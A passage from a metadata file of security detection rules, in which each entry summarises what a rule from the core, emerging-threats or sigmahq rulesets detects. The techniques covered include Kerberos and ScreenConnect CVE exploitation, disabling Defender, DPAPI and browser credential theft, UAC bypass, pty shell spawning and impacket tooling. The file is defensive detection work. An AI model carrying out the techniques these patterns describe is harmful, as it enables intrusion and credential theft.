  Rule-Body-Hash: 7b85681f415323c8105d9f2747ba32ad
  Ruleset: emerging-threats
  Summary: This rule detects an exploitation attempt of CVE-2021-42278 by monitoring
    specific Kerberos Key Distribution Center (KDC) events in Windows systems. The
    attacker initiates the exploit by creating a computer object with known permissions
    and then clears the ServicePrincipalName attribute. By doing so, the attacker,
    as the creator and owner of the object, gains additional permissions to make further
    changes. The detection focuses on Kerberos KDC event logs, particularly events
    indicating anomalies such as PAC without attributes, tickets without PAC, tickets
    without a requestor, and requestor mismatches.
  Updated-Date: '2024_09_03'
44d7af7e-88e6-4490-be11-55f7ff4d9fc1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4bf305011a98f92668ed8e766de4e777
  Ruleset: emerging-threats
  Summary: This rule detects file modifications to ASPX and ASHX files within the
    root of the App_Extensions directory in ScreenConnect due to a ZipSlip vulnerability
    present in versions prior to 23.9.8. This vulnerability, identified as CVE-2024-1708,
    allows for path traversal exploits impacting the software. The rule specifically
    monitors activities involving the ScreenConnect.Service.exe process and filters
    legitimate activities to minimize false positives.
  Updated-Date: '2024_09_03'
44e24481-6202-4c62-9127-5a0ae8e3fe3d:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8847b3fb24bbb7d22bef855c2b0f79b5
  Ruleset: core
  Summary: This rule detects the execution of obfuscated PowerShell one-liners that
    are specifically designed to download and run PowerShell modules in memory. This
    technique often includes a command line containing specific indicators such as
    an HTTP address, a web response manipulation, string operations, and module importation
    commands. This behavior is associated with attempts to evade defenses and execute
    malicious code on Windows systems without writing to disk.
  Updated-Date: '2024_09_03'
4508a70e-97ef-4300-b62b-ff27992990ea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28598c0ad8a42e1f232ac3a9d86957de
  Ruleset: core
  Summary: This rule detects .NET Common Language Runtime (CLR) Dynamic Link Libraries
    (DLLs) being loaded by various scripting applications such as cscript.exe, wscript.exe,
    and others. This activity can serve as an indication of potential suspicious execution,
    as legitimate usage of .NET CLR DLLs by these scripting applications is uncommon
    and may suggest malicious behavior, such as execution of payloads using techniques
    like DotNetToJScript.
  Updated-Date: '2024_09_03'
45239e6a-b035-4aaf-b339-8ad379fcb67e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 734952155745da6e1beadd4003daecf1
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "Squirrel.exe" binary and associated
    executables, such as "update.exe," to execute arbitrary processes. Squirrel.exe
    is commonly utilized in installations of several Electron-based applications,
    including Slack, Teams, and Discord, among others. It identifies specific command
    line parameters like '--processStart', '--processStartAndWait', and '--createShortcut'
    that are indicative of process proxy execution. Additionally, it incorporates
    filters to exclude legitimate usage scenarios involving popular applications like
    Discord, GitHub Desktop, Microsoft Teams, and Yammer, reducing the likelihood
    of false positives from expected behaviors of these tools.
  Updated-Date: '2024_09_04'
452bce90-6fb0-43cc-97a5-affc283139b3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d56ff1055ad963c3be1e7b4e94d583c2
  Ruleset: core
  Summary: This rule detects the use of "reg.exe" to tamper with various Windows Defender
    registry keys, potentially to disable crucial protection and detection features.
    It identifies command lines targeting specific registry paths associated with
    Windows Defender and flags commands that modify settings to disable features like
    exploit protection override, controlled folder access, PUA protection, spynet
    reporting, sample submission consent, and tamper protection. Additionally, it
    detects commands intended to disable real-time protection, antivirus capabilities,
    behavior monitoring, script scanning, and other security-related functionalities,
    which could indicate malicious intent to weaken system defenses.
  Updated-Date: '2024_09_03'
452df256-da78-427a-866f-49fa04417d74:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c796196b876b19861fe2f0661eaf44c0
  Ruleset: sigmahq
  Summary: This rule detects attempts to delete MacOS Time Machine backups via the
    "tmutil" utility. Such actions might be executed by an adversary intending to
    disable the backup system in preparation for a ransomware attack, thereby preventing
    the victim from being able to restore their files.
  Updated-Date: '2024_09_04'
45545954-4016-43c6-855e-eae8f1c369dc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9e6dac95a13a002d349c5ad9ed85341
  Ruleset: core
  Summary: This rule detects access to a protected_storage service over the network,
    indicating potential misuse of the Data Protection API (DPAPI) to extract domain
    backup keys from Domain Controllers.
  Updated-Date: '2024_09_03'
455b9d50-15a1-4b99-853f-8d37655a4c1b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: df598740108107caea6e61813b3c1ead
  Ruleset: core
  Summary: This rule detects suspicious Active Directory enumeration activity performed
    using AdFind.EXE, a command-line tool used for querying Active Directory objects.
    The detection focuses on specific command-line flags indicative of enumeration
    behaviors, such as listing password policy details and enumerating Active Directory
    administrators and Exchange-related objects.
  Updated-Date: '2024_09_03'
457df417-8b9d-4912-85f3-9dbda39c3645:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a85c15a7f68e54155a3ce4e4b147dce
  Ruleset: core
  Summary: This rule detects the execution of binaries located in potentially suspicious
    locations using the "nohup" command on Linux systems. The detection focuses on
    processes that are executed from the '/tmp/' directory and leverage the "nohup"
    command, which is often used to run commands in the background even after a user
    has logged out. This pattern is indicative of attempts to maintain persistent
    malicious activities on a compromised system. References include analyses of GobRAT
    malware, known for exploiting such techniques.
  Updated-Date: '2024_09_03'
459a2970-bb84-4e6a-a32e-ff0fbd99448d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d7193b565055618eff0cefff80e16e5
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of an Azure Key Vault. Such
    activities include writing to the Key Vault, deleting the Key Vault, deploying
    actions related to the Key Vault, and modifying access policies. This monitoring
    helps identify unauthorized or unintended alterations that could impact security
    or availability. Regular administrative activities could also trigger this rule;
    therefore, it is essential to verify if the changes are performed by authorized
    personnel. Any modifications from unfamiliar users should be thoroughly investigated
    to prevent potential security breaches.
  Updated-Date: '2024_09_04'
459f2f98-397b-4a4a-9f47-6a5ec2f1c69d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 368fd6d7722c106380e85de569d8ce6c
  Ruleset: sigmahq
  Summary: This rule detects the usage of "MSOHTMED.exe" to download arbitrary files.
    "MSOHTMED.exe" is identified by its executable name or the original file name
    and is monitored for command line activity containing URLs such as 'ftp://', 'http://',
    or 'https://'. This behavior is indicative of potential misuse for defense evasion
    and execution of attacks.
  Updated-Date: '2024_09_04'
45a594aa-1fbd-4972-a809-ff5a99dd81b8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58f456ba670cc4e999eca179862f98d8
  Ruleset: core
  Summary: This rule detects the execution of a PowerShell script originating from
    an Alternate Data Stream (ADS) on Windows systems. It identifies instances where
    both the parent and executing process are either `powershell.exe` or `pwsh.exe`,
    and the command line includes the use of `Get-Content` with the `-Stream` option.
    This type of activity is typically related to defense evasion techniques.
  Updated-Date: '2024_09_03'
45d3a03d-f441-458c-8883-df101a3bb146:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f6047deef0bcb35102cd5c74ceb544c
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'Launch-VsDevShell.ps1' script, a Microsoft
    signed script, to execute commands. The script is often associated with the 'VsDevShell'
    environment configuration and development-related tasks. The detection specifically
    looks for command lines containing 'Launch-VsDevShell.ps1' and flags specific
    keywords such as 'VsWherePath' and 'VsInstallationPath' to identify potential
    misuse or proxy execution of commands. Possible false positives include legitimate
    use by developers.
  Updated-Date: '2024_09_04'
45e112d0-7759-4c2a-aa36-9f8fb79d3393:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a31b6bb6ff044060827612c61d7d44f
  Ruleset: sigmahq
  Summary: This rule detects changes in the Windows registry that indicate modifications
    to the security zones in Internet Explorer, specifically for adding a domain to
    the trusted sites zone. Such changes are identified by monitoring the registry
    path "\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\".
    The rule excludes certain known legitimate actions, such as administrative scripts
    and specific DWORD values associated with the "My Computer" and "Local Intranet
    Zone" security zones. This detection can help identify potential attempts to hide
    file extensions through registry modifications as a means of persistence or other
    malicious activities.
  Updated-Date: '2024_09_04'
45eb2ae2-9aa2-4c3a-99a5-6e5077655466:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6cd25f53f119b9e319bbdad889a8d3c4
  Ruleset: emerging-threats
  Summary: This rule detects the modification of an existing computer account name
    to one that does not include the '$' symbol, a technique observed in attacks exploiting
    CVE-2021-42287. This behavior can indicate efforts to bypass security measures,
    enable persistence, or obfuscate malicious actions on Windows systems by renaming
    accounts in a way that evades standard recognition patterns and logging mechanisms.
  Updated-Date: '2024_09_03'
460479f3-80b7-42da-9c43-2cc1d54dbccd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5464ba7cfda6ee48bcdfb2812b99fae
  Ruleset: core
  Summary: This rule detects the creation of a local hidden user account by monitoring
    specific registry activity on a Windows system. It looks for changes in the registry
    path \SAM\SAM\Domains\Account\Users\Names\ that end with a dollar sign ($), which
    is a common convention for hidden user accounts, and associates this activity
    with the lsass.exe process. This helps in identifying potentially malicious attempts
    to persistently hide user accounts on a local machine.
  Updated-Date: '2024_09_03'
46123129-1024-423e-9fae-43af4a0fa9a5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef1be3db97d3af48d7d736538de70b77
  Ruleset: core
  Summary: This rule detects the use of Windows Defender's MpCmdRun.EXE to download
    files. MpCmdRun.EXE is part of the Microsoft Malware Protection Command Line Utility.
    The rule is triggered when the process creation logs show the execution of MpCmdRun.EXE
    with command line arguments that include 'DownloadFile' and a 'url'. This activity
    may indicate a defense evasion technique or command-and-control activity.
  Updated-Date: '2024_09_03'
4627c6ae-6899-46e2-aa0c-6ebcb1becd19:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dfb2b977382de56de24d7d06901d5f82
  Ruleset: core
  Summary: This rule detects the execution of various compiled Windows binaries from
    the impacket toolset based on their names or partial names. The impacket toolset
    includes binaries such as `goldenPac`, `karmaSMB`, `ntlmrelayx`, `secretsdump`,
    and `wmiexec`, among others. Additionally, it identifies binaries that end with
    specific names like `atexec_windows.exe`, `GetADUsers_windows.exe`, `mimikatz_windows.exe`,
    `psexec_windows.exe`, and `smbclient_windows.exe`. The rule aims to recognize
    potentially malicious activities associated with the deployment of these tools.
    Impacket is a collection of Python classes for working with network protocols
    and is often used for network attacks and lateral movement in cybersecurity contexts.
  Updated-Date: '2024_09_03'
46490193-1b22-4c29-bdd6-5bf63907216f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2bda8714e1afd87a8695d84a3cf951e1
  Ruleset: core
  Summary: This rule detects VBScript content stored in Windows registry keys, a technique
    employed by the UNC2452 group. It identifies specific VBScript and related content
    within registry paths under 'Software\Microsoft\Windows\CurrentVersion' and filters
    out common false positives related to legitimate software processes. This technique
    is associated with persistence mechanisms used by sophisticated adversaries to
    execute code via the Windows registry. This detection helps identify potential
    misuse of VBScript for malicious purposes, contributing to the overall security
    posture by flagging unauthorized registry modifications.
  Updated-Date: '2024_09_03'
46530378-f9db-4af9-a9e5-889c177d3881:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4c064d920f098eac16200a7c81b5d18
  Ruleset: sigmahq
  Summary: This rule detects when a device or device configuration in Azure is modified
    or deleted. It recognizes activities such as deleting a device, deleting a device
    configuration, updating a device, and updating a device configuration. It suggests
    investigating actions performed by unfamiliar users to distinguish between legitimate
    administrative tasks and potential malicious activity.
  Updated-Date: '2024_09_04'
46612ae6-86be-4802-bc07-39b59feb1309:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5550bea2f03419cb4107b84018ef601f
  Ruleset: sigmahq
  Summary: This rule detects file access requests to the Windows Data Protection API
    (DPAPI) Master keys by uncommon applications, which can indicate credential theft
    activities. An example of such malicious activity is the use of Mimikatz's "dpapi::masterkey"
    function to extract sensitive data. The rule monitors for access in specific directories
    related to system and user DPAPI keys, while filtering out legitimate system processes
    to reduce false positives.
  Updated-Date: '2024_09_04'
46a68649-f218-4f86-aea1-16a759d81820:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1ed50f643384494651c95b15c4e7b81
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows Defender exclusion registry
    key, which could signify suspicious or malicious activity. Attackers might alter
    this key to add new exclusions to bypass Windows Defender security measures.
  Updated-Date: '2024_09_04'
46dd5308-4572-4d12-aa43-8938f0184d4f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05ccadb7861b10c3cb94a27f73b8d106
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) on Windows
    systems using a fileless method that manipulates the DelegateExecute registry
    key. This technique, which is categorized under privilege escalation and defense
    evasion, involves creating or modifying the DelegateExecute key under specific
    registry paths to execute commands with elevated privileges without triggering
    a UAC prompt. The absence of specific details in the key indicates potential misuse
    for unauthorized privilege escalation.
  Updated-Date: '2024_09_03'
47147b5b-9e17-4d76-b8d2-7bac24c5ce1b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22fe27c8ca654b5d81ccb8b2c426045b
  Ruleset: sigmahq
  Summary: This rule detects potential theft of browser data by identifying processes
    that copy or move files associated with web browsers, specifically targeting credential
    storage locations. Cyber adversaries may attempt to obtain credentials stored
    by browsers in an encrypted format by accessing files that contain usernames and
    passwords for websites. Detection focuses on commands involving file operations
    (`copy-item`, `xcopy.exe`, `move`, etc.) and paths commonly used by various web
    browsers to store user data, including Google Chrome, Mozilla Firefox, Microsoft
    Edge, and others.
  Updated-Date: '2024_09_04'
4720b7df-40c3-48fd-bbdf-fd4b3c464f0d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ffe1a5f0009a9a18706d2d1b9b4aa3aa
  Ruleset: core
  Summary: This rule detects the creation of a new registry key under 'TaskCache'
    which occurs when a new scheduled task is registered by a process other than svchost.exe,
    as such actions are deemed suspicious. The rule is designed to identify potential
    malicious activities, including persistence mechanisms often employed by malware
    like the Sodinokibi (REvil) ransomware. It applies filters to exclude legitimate
    processes such as system services and trusted executables (e.g., TiWorker.exe,
    msiexec.exe, ngen.exe, DropboxUpdate.exe, and explorer.exe) that may also interact
    with the TaskCache.
  Updated-Date: '2024_09_03'
472159c5-31b9-4f56-b794-b766faa8b0a7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f55897ca65e922ebeec22078a7dd030b
  Ruleset: core
  Summary: This rule detects suspicious access to the Local Security Authority Subsystem
    Service (LSASS) handle via a call trace to "seclogon.dll" with a specific access
    right. It identifies cases where processes targeting LSASS (lsass.exe) are initiated
    by the Service Host process (svchost.exe) and have been granted a suspicious access
    right (0x14c0). This activity is flagged due to the potential for credential access
    threats.
  Updated-Date: '2024_09_03'
477a5ed3-a374-4282-9f3b-ed94e159a108:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b8b486c71829ce208093f505ccf6d4c
  Ruleset: emerging-threats
  Summary: This rule detects a specific broken command used by the Goofy-Guineapig
    backdoor, as identified in an NCSC report. The backdoor operates on Windows systems
    and the detection focuses on process creation events where the command line contains
    'choice /t %d /d y /n >nul'. This command is indicative of Goofy-Guineapig's activity,
    and there are typically no false positives associated with it, marking it as a
    high-severity alert.
  Updated-Date: '2024_09_03'
4782eb5a-a513-4523-a0ac-f3082b26ac5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d260075b40ac5fe50c5e346b7c76842b
  Ruleset: core
  Summary: This rule detects the execution of commands that utilize the "mshtml.dll"
    RunHTMLApplication export to execute arbitrary code through various protocol handlers
    such as vbscript, javascript, file, and http. This behavior is associated with
    attempts to bypass security defenses and execute unauthorized code on Windows
    systems.
  Updated-Date: '2024_09_03'
47a1658b-67a4-48e2-8ab1-c10437fc0148:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 527df4b0bebf4a4437da66e5decc5514
  Ruleset: emerging-threats
  Summary: This rule detects any creation or modification of a Windows domain group
    named "ESX Admins," which could indicate a potential exploitation attempt of CVE-2024-37085.
    This vulnerability allows an attacker to elevate their privileges to full administrative
    access on a domain-joined VMware ESXi hypervisor. In such hypervisors joined to
    an Active Directory domain, any member of a domain group named "ESX Admins" is
    granted full administrative access by default.
  Updated-Date: '2024_09_03'
47b3bbd4-1bf7-48cc-84ab-995362aaa75a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11e036af498f485fc8d63cf05ac5ca69
  Ruleset: sigmahq
  Summary: This rule detects the use of the "git" utility on Linux systems to execute
    a shell. This activity can be indicative of privilege escalation, unauthorized
    command execution, or attempts to escape from restricted environments. The detection
    is triggered by specific parameters in the process creation logs, such as the
    presence of certain command-line arguments and indicators of bash, dash, or sh
    shell execution.
  Updated-Date: '2024_09_04'
47d65ac0-c06f-4ba2-a2e3-d263139d0f51:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 73df9f3a813920d2ab0095f2af1cf192
  Ruleset: sigmahq
  Summary: This rule detects potential infections of XCSSET malware on macOS systems
    by identifying execution traces indicative of the trojan's behavior. XCSSET is
    known for spreading through Xcode projects and maliciously altering applications.
    The malware poses a significant threat as it can steal credentials, account information,
    and other sensitive data from infected users. Specific indicators include unusual
    process creations involving tools like `curl`, `osacompile`, `plutil`, and `zip`
    within certain directories and command line patterns pointing to suspicious URLs
    and modifications.
  Updated-Date: '2024_09_04'
47e0852a-cf81-4494-a8e6-31864f8c86ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a577c525cb1fe7606f6d3dded1644c86
  Ruleset: core
  Summary: This rule detects the presence of the Pandemic Windows Implant by identifying
    specific registry key modifications in the Windows operating system. The targeted
    registry path is '\SYSTEM\CurrentControlSet\services\null\Instance', which is
    associated with this particular malware. Pandemic is a type of malware highlighted
    in the Vault7 leaks, which typically involves command-and-control techniques for
    unauthorized remote access.
  Updated-Date: '2024_09_03'
47e4bab7-c626-47dc-967b-255608c9a920:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0cbfe4af91dfeaf2437ec00aad97b2c
  Ruleset: sigmahq
  Summary: This rule detects the usage of the findstr.exe utility with the keywords
    "EVERYONE" or "BUILTIN" in the command line, indicating an attempt to find permissions
    misconfigurations on files or folders related to general or built-in user groups.
    This behavior has been observed in combination with other utilities like icacls.exe
    to identify vulnerabilities that may be exploited for privilege escalation.
  Updated-Date: '2024_09_04'
480421f9-417f-4d3b-9552-fd2728443ec8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: efd1d019898be77dc538c537551d4320
  Ruleset: sigmahq
  Summary: This rule detects modifications to the autorun keys in the Windows registry,
    specifically within the Wow6432Node for Windows NT's Current Version. Modifications
    to these autostart extensibility points (ASEPs) can indicate an attempt to establish
    persistence by automatically launching software upon system startup. It focuses
    on registry changes involving AppInit_DLLs, Image File Execution Options, and
    Drivers32. While legitimate software installations or administrator actions may
    also modify these keys, the rule assists in identifying potentially malicious
    activities aimed at maintaining persistent access to a system.
  Updated-Date: '2024_09_04'
4809c683-059b-4935-879d-36835986f8cf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 261c76689166a351e210b9b70e8a426b
  Ruleset: sigmahq
  Summary: This rule detects the execution of "system_profiler" on macOS systems,
    focusing on specific data types such as SPApplicationsDataType, SPHardwareDataType,
    SPNetworkDataType, and SPUSBDataType. These data types are frequently utilized
    by threat actors and malware for system information discovery to gather detailed
    hardware and software configuration information. Additionally, "system_profiler"
    can be employed to ascertain the presence of virtualization software for defense
    evasion purposes.
  Updated-Date: '2024_09_04'
480e7e51-e797-47e3-8d72-ebfce65b6d8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 72f7e45f3a70c1dcbb44d0dfdd6dbb6c
  Ruleset: core
  Summary: This rule detects the execution of Python scripts on Windows systems that
    invoke a pseudoterminal (PTY), typically indicative of an attempt to spawn an
    interactive shell. It monitors process creation events where the executing image
    is either `python.exe`, `python2.exe`, or `python3.exe`, and the command line
    includes specific Python code patterns such as `import pty` combined with `.spawn(`
    or `from pty import spawn`. This behavior can be associated with exploitation
    activities as detailed in the referenced blog post about zero-day exploitation
    of Atlassian Confluence.
  Updated-Date: '2024_09_03'
4833155a-4053-4c9c-a997-777fcea0baa7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 833bacf1e792742dde91220c86fd364d
  Ruleset: core
  Summary: This rule detects the use of the "sqlite" application to query databases
    associated with Firefox and other Gecko-based browsers. Such activity may indicate
    attempts to access or steal user data, such as cookies and browsing history, stored
    within these databases. Potential indicators include commands targeting specific
    SQLite files like 'cookies.sqlite' and 'places.sqlite'.
  Updated-Date: '2024_09_03'
48437c39-9e5f-47fb-af95-3d663c3f2919:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90c2740fc618f21db4336bd1404c289b
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable User Account Control (UAC) by identifying
    when the registry value "EnableLUA" is set to 0 in the Windows Registry. Disabling
    UAC can allow unauthorized actions on the system, providing an attacker with an
    opportunity for privilege escalation and defense evasion.
  Updated-Date: '2024_09_04'
48739819-8230-4ee3-a8ea-e0289d1fb0ff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb656d6d326cfa7bb3fc35f3ad0fdac9
  Ruleset: sigmahq
  Summary: This rule detects the deletion of an Azure Active Directory (AD) Hybrid
    Health AD FS (Active Directory Federation Services) service instance within a
    tenant using Azure activity logs. Such activity may indicate that a threat actor
    has created a new AD Health AD FS service and a fake server to spoof AD FS signing
    logs, and subsequently deleted the health AD FS service via HTTP requests to Azure
    when it is no longer needed.
  Updated-Date: '2024_09_04'
487bb375-12ef-41f6-baae-c6a1572b4dd1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3594a81bc63c8061dd551b061e6fe844
  Ruleset: core
  Summary: This rule detects potential persistence activity via the Outlook Today
    page. An attacker can manipulate this page to execute arbitrary code by setting
    a custom page and linking it via the registry values "URL" and "UserDefinedUrl".
    The detection focuses on specific registry paths associated with Microsoft Office
    and Outlook, ensuring that normal activity from Office ClickToRun processes is
    filtered out. This indicates an attempt to establish persistence by modifying
    these registry values to point to a malicious URL.
  Updated-Date: '2024_09_03'
487c7524-f892-4054-b263-8a0ace63fc25:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9a2a83b2239262ae27db58716acc381a
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell commands via standard
    input (Stdin) in scripts, which is a common tactic for executing hidden or disguised
    commands. Specifically, it monitors for events recorded by the Service Control
    Manager in Windows when a new service creation event (Event ID 7045) is logged,
    and the command path (ImagePath) includes certain suspicious elements. These elements
    include concatenated commands using "set" and "&&", along with terms like "environment",
    "invoke", or "input". The intent is to identify obfuscated scripting that may
    be employed to evade defenses and execute unauthorized actions.
  Updated-Date: '2024_09_03'
488b44e7-3781-4a71-888d-c95abfacf44d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f043ca30ca8041730f6508f49ea155c5
  Ruleset: sigmahq
  Summary: "This rule detects when a user disables the Windows Firewall via a profile\
    \ to help evade defense mechanisms. It monitors PowerShell scripts, specifically\
    \ those containing the \"Set-NetFirewallProfile\" command with the \"-Enabled\"\
    \ parameter set to \"False,\" which indicates that the firewall has been disabled.\
    \ This action can significantly compromise a system\u2019s security by allowing\
    \ unauthorized traffic through the firewall. Detection relies on Script Block\
    \ Logging being enabled to capture such events."
  Updated-Date: '2024_09_04'
48917adc-a28e-4f5d-b729-11e75da8941f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d8b8423161bd40e6f1fc142589f442fd
  Ruleset: sigmahq
  Summary: This rule detects the use of "reg.exe" to add folder exclusions in Windows
    Defender, a method employed by the Qbot malware to exclude specific folders such
    as those within AppData and ProgramData. This activity can be indicative of an
    attempt to evade antivirus detection by modifying Windows Defender settings to
    bypass scanning of certain directories. The detection focuses on the command-line
    arguments used with "reg.exe" related to the Windows Defender exclusion paths.
  Updated-Date: '2024_09_04'
48a45d45-8112-416b-8a67-46e03a4b2107:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42afad63534d5319ad547d18c8625d21
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell commands aimed at removing
    an account from the Domain Admin group in a Windows environment. It monitors for
    script block text containing specific command patterns, namely 'Remove-ADGroupMember',
    along with certain parameters indicating an attempt to manipulate group membership.
    This activity may signal adversarial actions intended to disrupt availability
    and inhibit legitimate user access by altering critical account memberships.
  Updated-Date: '2024_09_04'
48a61b29-389f-4032-b317-b30de6b95314:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f28b19694b6de40ee61b060501d2f7e1
  Ruleset: core
  Summary: This rule detects suspicious Plink tunnel port forwarding to a local port.
    Plink is a command-line SSH, Telnet, and Rlogin client commonly used for network
    connections. The rule identifies unusual activity involving remote port forwarding,
    often indicative of command-and-control actions or lateral movement within a network.
    Although legitimate administrative activity can also use similar port forwarding,
    such patterns are flagged for further investigation due to their potential risk.
  Updated-Date: '2024_09_03'
48bbc537-b652-4b4e-bd1d-281172df448f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4d3e0d39ed692ec6a0d4cb8a339eba6
  Ruleset: sigmahq
  Summary: This rule detects the execution of Sysinternals PsSuspend, a utility that
    can be misused to suspend critical processes in a Windows environment. PsSuspend
    is typically used for system management purposes but could be leveraged by adversaries
    for discovery and persistence activities by suspending important system processes.
    The rule identifies the execution of the PsSuspend tool by looking for processes
    with specific file names such as 'pssuspend.exe' or 'pssuspend64.exe'.
  Updated-Date: '2024_09_04'
48bfd177-7cf2-412b-ad77-baf923489e82:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef6b926d74c9d7766ec320b06e4e2c67
  Ruleset: core
  Summary: This rule detects the suspicious loading of the vsstrace.dll file by uncommon
    executables. It focuses on identifying instances where the Volume Shadow Copy
    Service (VSS) DLL is loaded outside of typical, legitimate processes in a Windows
    environment. The rule filters out known legitimate executables and directories,
    including standard Windows system directories and certain folders in "Program
    Files" associated with backup solutions, to reduce false positives. Potential
    triggers outside these filters could indicate attempts to manipulate or delete
    volume shadow copies, a tactic often related to defense evasion or destructive
    actions such as data wiping or ransomware activities.
  Updated-Date: '2024_09_03'
48d91a3a-2363-43ba-a456-ca71ac3da5c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: baa6f3b8d0c664c4e4f0a8a75f832dc8
  Ruleset: core
  Summary: This rule detects events generated by user-mode applications when they
    invoke the CveEventWrite API to exploit a known vulnerability. This log generation
    started in January 2020, specifically with regard to CVE-2020-0601, a Windows
    CryptoAPI vulnerability. Events identified under this rule indicate potential
    exploitation attempts of such vulnerabilities, although instances of CVEs being
    recorded in this log are currently limited.
  Updated-Date: '2024_09_03'
48ea844d-19b1-4642-944e-fe39c2cc1fec:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 784936ab72722064771e15f0bdad892e
  Ruleset: core
  Summary: This rule detects the creation of a file by the "dllhost.exe" process within
    the System32 directory, which is associated with the "IDiagnosticProfileUAC" User
    Account Control (UAC) bypass technique. This activity indicates a potential execution,
    defense evasion, or privilege escalation attack as described in technique T1548.002.
    The rule specifically looks for files with a ".dll" extension that are created
    by "dllhost.exe" in the specified directory path.
  Updated-Date: '2024_09_03'
4916a35e-bfc4-47d0-8e25-a003d7067061:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 79f5067d52eba968a2d97834a890baba
  Ruleset: sigmahq
  Summary: This rule detects changes in the altitude value of the Sysmon driver, which
    is part of the Windows Registry. Sysmon, a system monitoring tool from Microsoft,
    uses a specific altitude to load correctly during system boot. Altering this value
    to match that of another registered service can cause Sysmon to fail to load.
    This tactic is often associated with defense evasion techniques, such as unloading
    or hiding Sysmon.
  Updated-Date: '2024_09_04'
4922a5dd-6743-4fc2-8e81-144374280997:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
